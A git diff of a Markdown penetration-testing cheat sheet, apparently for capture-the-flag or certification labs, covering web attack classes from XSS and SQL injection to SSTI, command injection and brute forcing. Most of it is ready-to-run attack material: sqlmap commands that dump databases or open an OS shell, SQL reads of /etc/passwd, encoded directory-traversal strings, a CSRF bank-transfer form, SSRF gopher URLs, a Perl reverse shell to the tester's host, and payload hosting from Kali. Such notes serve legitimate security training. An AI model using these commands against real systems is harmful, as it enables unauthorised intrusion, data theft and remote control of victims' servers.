@@ -1,6 +1,7 @@
 # Testing vulnerabilities 
 
 ## Serve files from Kali
+<!-- Host payload files via Python HTTP server on port 80 -->
 1. Create folder `mkdir payloads`
 2. Add files to folder that you want to serve to target machine 
 3. `cd` to the created folder 
@@ -10,6 +11,7 @@ python3 -m http.server 80
 ```
 
 ## XSS (Cross-Site Scripting)
+<!-- Inject malicious scripts into pages viewed by other users -->
 
 ### Manual
 ```shell
@@ -25,6 +27,7 @@ wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt -d "username=FU
 ```
 
 ## CSRF (Cross-Site Request Forgery)
+<!-- Trick authenticated user into submitting unintended requests -->
 With XSS e.g. attacker tricks a user into submitting a request to a site where the user already has an active, authenticated session.
 ```shell
 <form action="https://bank.com/transfer" method="POST">
@@ -38,6 +41,7 @@ With XSS e.g. attacker tricks a user into submitting a request to a site where t
 ```
 
 ## SSRF (Server‑Side Request Forgery)
+<!-- Force server to make requests to internal or external resources -->
 Force an application or server to request data or a resource, where a link can be set.
 ```shell
 file:///tmp/foo.txt
@@ -46,6 +50,7 @@ gopher://127.0.0.1:80/_POST%20/status%20HTTP/1.1%0a
 ```
 
 ## SQLi (SQL Injection)
+<!-- Inject SQL code into queries to manipulate the database -->
 
 ### Fuzzing GET parameter
 ```shell
@@ -57,22 +62,59 @@ wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -u "$IP/index.php
 wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "id=FUZZ" -u "$IP/index.php"
 ```
 
-### sqlmap GET parameter
+### Sqlmap GET parameter
 ```shell
 sqlmap -u "$IP/index.php?id=1"
 ```
 
-### sqlmap POST parameter
+### Sqlmap POST parameter
 Copy POST request from Burp Suite into `post.txt` file
 ```shell
-sqlmap -r request.txt --batch --dump
+sqlmap -r request.txt --dump --batch
+```
+or 
+```shell
+sqlmap -r request.txt --os-shell
+```
+use in parameter
+```
+'-p username' or '*' or nothing
 ```
 
+### Reading and writing files
+
+no permission user reading files
+```
+SELECT pg_read_files('/etc/passwd'); # postgresql
+SELECT LOAD_FILE('/etc/passwd'); # mysql
+```
+
+### Error based payloads
+mysql
+```
+ asc, extractvalue('',concat('>',(
+    select group_concat(table_schema)
+    from (
+      select table_schema
+      from information_schema.tables
+      group by table_schema)
+    as foo)
+    )
+```
+
+The group_concat() function is unique to MySQL. Current versions of Microsoft SQL Server and PostgreSQL have a very similar STRING_AGG() function. Additionally, current versions of Oracle DB have a LISTAGG() function that is similar to the STRING_AGG() functions.
+
 ## Directory Traversal
+<!-- Access files outside the web root using path sequences -->
 
 ### Fuzzing LFI default file paths
 ```shell
 wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hh 0 --hc 500 "$IP/index.php?id=FUZZ"
+```
+
+### Fuzzing LFI for specific files
+```shell
+wfuzz -c -z file,/usr/share/seclists//Fuzzing/LFI/LFI-gracefulsecurity-linux.txt --hh 0 --hc 500 "$IP:8080/view?page=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fFUZZ"
 ```
 
 ### Fuzzing LFI app specific files
@@ -89,6 +131,7 @@ wfuzz -w paths.txt -w files.txt --hh 0 "$IP/index.php?id=FUZZFUZ2Z"
 ```
 
 ## XXE (XML External Entity)
+<!-- Exploit XML parsers to read files or perform SSRF -->
 
 ### Fuzzing XXE 
 Wordlist to use in Burp Suite Intruder for fuzzing XXE: `/usr/share/seclists/Fuzzing/XXE-Fuzzing.txt`
@@ -114,6 +157,7 @@ Wordlist to use in Burp Suite Intruder for fuzzing XXE: `/usr/share/seclists/Fuz
 Note that extracting file with multiple lines may not work due to encoding issues.
 
 ## SSTI (Server-side Template Injection)
+<!-- Inject template expressions to execute code server-side -->
 
 ### Discover SSTI 
 ```plaintext
@@ -134,11 +178,17 @@ ${dir()} # if ['__M_caller', '__M_locals', '__M_writer', 'context', 'dir', 'page
 <%= 7 * 7 %> # if 49 => EJS
 ```
 
-## Command Injection 
+## Command Injection
+<!-- Execute OS commands through vulnerable application input fields -->
+
+### Discovery
+```
+ffuf -request checkout-request.txt -w list.txt
+```
 
 ### Fuzzing command injection 
 ```shell
-wfuzz -c -z file,"/usr/share/payloadsallthethings/Command Injection/Intruder/command-execution-unix.txt" --sc 200 "$IP/index.php?parameter=idFUZZ"
+wfuzz -c -z file,/usr/share/payloadsallthethings/CommandInjection/Intruder/command-execution-unix.txt --sc 200 "$IP/index.php?parameter=idFUZZ"
 ```
 
 ### Setup reverse shell listener 
@@ -176,6 +226,7 @@ perl -e 'use Socket;$i="[kali-ip]";$p=4242;socket(S,PF_INET,SOCK_STREAM,getproto
 ```
 
 ## IDOR (Insecure Direct Object Reference)
+<!-- Access unauthorized objects by guessing or enumerating IDs -->
 
 ### Static file IDOR 
 ```shell
@@ -187,7 +238,8 @@ wfuzz -c -z range,1-100 --hc 404 "$IP/index.php?doc=FUZZ.txt"
 wfuzz -c -z range,1-100 --hc 404 "$IP/index.php?doc=FUZZ"
 ```
 
-## Brute forcing 
+## Brute forcing
+<!-- Enumerate valid credentials using wordlists and fuzzing tools -->
 
 ### Create wordlist
 
@@ -210,7 +262,10 @@ wfuzz -c -z file,user.txt -z file,/usr/share/seclists/Passwords/Common-Credentia
 ```
 
 ## Locations proof.txt
+<!-- Common paths where proof.txt flag file may be located -->
 /proof.txt
 /var/tmp/proof.txt
 /root/proof.txt
 /app/proof.txt
+
+## Hints
